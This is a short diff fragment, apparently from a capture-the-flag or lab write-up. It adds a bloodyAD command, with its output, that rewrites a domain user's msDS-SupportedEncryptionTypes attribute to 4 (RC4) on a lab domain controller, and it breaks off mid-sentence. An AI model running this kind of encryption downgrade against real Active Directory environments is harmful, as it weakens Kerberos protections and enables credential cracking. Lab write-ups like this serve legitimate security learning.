@@ -540,3 +540,10 @@ msDS-SupportedEncryptionTypes: WRITE
 
 As seen here i can write to it!
 
+```python
+bloodyAD --host dc.novaforge.local -d novaforge.local -k set object 'm.lee' 'msDS-SupportedEncryptionTypes' -v '4'
+[+] m.lee's msDS-SupportedEncryptionTypes has been updated
+```
+
+Ive changed the value to 4 which represents th
+
